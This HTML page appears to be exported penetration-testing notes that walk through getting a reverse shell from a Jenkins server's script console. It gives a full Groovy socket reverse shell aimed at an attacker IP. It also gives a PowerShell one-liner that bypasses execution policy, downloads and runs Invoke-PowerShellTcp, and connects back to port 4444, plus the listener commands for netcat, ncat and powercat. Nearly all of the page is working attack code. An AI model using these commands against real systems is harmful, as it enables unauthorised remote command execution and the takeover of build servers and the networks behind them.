<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Reverse Shell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Reverse Shell</h1><br/>1. We can create a reverse shell by executing a Groovy script like this: <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76</a><br />    In the Console Script of Jenkins(http://&lt;jenkins_server&gt;:8080/script)<br />   ◇ Command line<br />       <div class="codebox"><pre><span style="color:#7f0044;font-weight:400">String</span> host<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#3ad900;font-weight:400">&quot;&lt;IpAddressAttacker&gt;&quot;</span>;<br /><span style="color:#7f0044;font-weight:400">int</span> port<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">4444</span>;<br /><span style="color:#7f0044;font-weight:400">String</span> cmd<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#3ad900;font-weight:400">&quot;cmd.exe&quot;</span>;<br /><span style="color:#ff9d00;font-weight:700">Process</span> p<span style="color:#ff9d00;font-weight:700">=</span>new ProcessBuilder(cmd).redirectErrorStream(true).<span style="color:#ff9d00;font-weight:700">start</span>();Socket s<span style="color:#ff9d00;font-weight:700">=</span>new Socket(host,port);InputStream pi<span style="color:#ff9d00;font-weight:700">=</span>p.getInputStream(),pe<span style="color:#ff9d00;font-weight:700">=</span>p.getErrorStream(), <span style="color:#ff9d00;font-weight:700">si=</span>s.getInputStream();OutputStream po<span style="color:#ff9d00;font-weight:700">=</span>p.getOutputStream(),so<span style="color:#ff9d00;font-weight:700">=</span>s.getOutputStream();<span style="color:#ff9d00;font-weight:700">while</span>(<span style="color:#ff9d00;font-weight:700">!</span>s.isClosed()){<span style="color:#ff9d00;font-weight:700">while</span>(pi.available()&gt;<span style="color:#333333;font-weight:400">0</span>)so.<span style="color:#ff9d00;font-weight:700">write</span>(pi.read());<span style="color:#ff9d00;font-weight:700">while</span>(pe.available()&gt;<span style="color:#333333;font-weight:400">0</span>)so.<span style="color:#ff9d00;font-weight:700">write</span>(pe.read());<span style="color:#ff9d00;font-weight:700">while</span>(<span style="color:#ff9d00;font-weight:700">si</span>.available()&gt;<span style="color:#333333;font-weight:400">0</span>)po.<span style="color:#ff9d00;font-weight:700">write</span>(<span style="color:#ff9d00;font-weight:700">si</span>.read());so.flush();po.flush();Thread.<span style="color:#ff9d00;font-weight:700">sleep</span>(<span style="color:#333333;font-weight:400">50</span>);<span style="color:#ff9d00;font-weight:700">try</span> {p.exitValue();<span style="color:#ff9d00;font-weight:700">break</span>;}<span style="color:#ff9d00;font-weight:700">catch</span> (Exception e){}};p.destroy();s.close();</pre></div> <br />   ◇ Powershell<br />    We need to follow the procedure already discussed <a href="lege_Escalation--Kerberos_Authentication_Attacks--Silver_Ticket--Forge_Silver_Ticket--HOST_service--Schedule_Reverse_Powershell(option_2).html">HERE</a>. We need to use a script like &#39;Invoke-PowerShellTcp.ps1&#39;, otherwise if we change only “cmd.exe” with “Powershell.exe” the shell will not be fully interactive, in other words we cannot execute commands.<br />    Execute this script(change the ip address with the address of you attacking machine).<br />        <div class="codebox"><pre>def sout <span style="color:#ff9d00;font-weight:700">=</span> new StringBuffer(), serr <span style="color:#ff9d00;font-weight:700">=</span> new StringBuffer()<br /><span style="color:#7f0044;font-weight:400">String</span> cmd <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;[Net.ServicePointManager]::SecurityProtocol = &#39;tls12, tls11, tls, Ssl3&#39;;iex(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IpAddress 192.168.1.118 -Port 4444&quot;</span><br /><span style="color:#7f0044;font-weight:400">String</span> <span style="color:#ff9d00;font-weight:700">ps</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">&#39;powershell.exe -nop -exec bypass -c &quot;&#39;</span> <span style="color:#ff9d00;font-weight:700">+</span> cmd <span style="color:#ff9d00;font-weight:700">+</span> <span style="color:#333333;font-weight:400">&#39;&quot;&#39;</span> <br />def proc <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">ps</span>.execute()<br />proc.consumeProcessOutput(sout, serr)<br />println <span style="color:#3ad900;font-weight:400">&quot;out&gt; $sout err&gt; $serr&quot;</span><br /></pre></div><br />    *At the start of cmd string we have added “<span style="color:#3ad900;">[Net.ServicePointManager]::SecurityProtocol = &#39;tls12, tls11, tls, Ssl3&#39;;</span>” to ensure that this script work also on older versions of Windows, where TLS2 for HTTPS requests was not a default settings.<br />2. While the Attacker machine should be listening for a connection of the Jenkins server<br />   ◇ <span style="text-decoration:underline;">Linux Attacker machine</span>:<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -lvp 4444</pre></div><br />    <a href=""><img src="images/1170-1.png" alt="images/1170-1.png" /></a><br />   ◇ <span style="text-decoration:underline;">Windows Attacker machine</span>: <br />      ▪ use netcat(can listen for both a powershell and a cmd shell):<br />      <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;http://nmap.org/dist/ncat-portable-5.59BETA1.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\ncat-portable-5.59BETA1\ncat.exe -vnl 4444&quot;</span>;<br /><br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\ncat-portable-5.59BETA1&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>;</pre></div><br />      <a href=""><img src="images/1170-2.png" alt="images/1170-2.png" /></a><br />      ▪ use powercat(listening for a powershell shell):<br />      <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).DownloadString(<span style="color:#3ad900;font-weight:400">&quot;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&quot;</span>)<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; powercat <span style="color:#ff9d00;font-weight:700">-</span>l <span style="color:#ff9d00;font-weight:700">-</span>v <span style="color:#ff9d00;font-weight:700">-</span>p <span style="color:#333333;font-weight:400">4444</span> <span style="color:#ff9d00;font-weight:700">-</span>t <span style="color:#333333;font-weight:400">1000</span></pre></div><br />      <a href=""><img src="images/1170-3.png" alt="images/1170-3.png" /></a><br /><br /><br />3. Now we can execute the Groovy script from the Jenkins server and gain a shell on our attacker machine<br />    <a href=""><img src="images/1170-4.png" alt="images/1170-4.png" /></a></div>
</body>
</html>
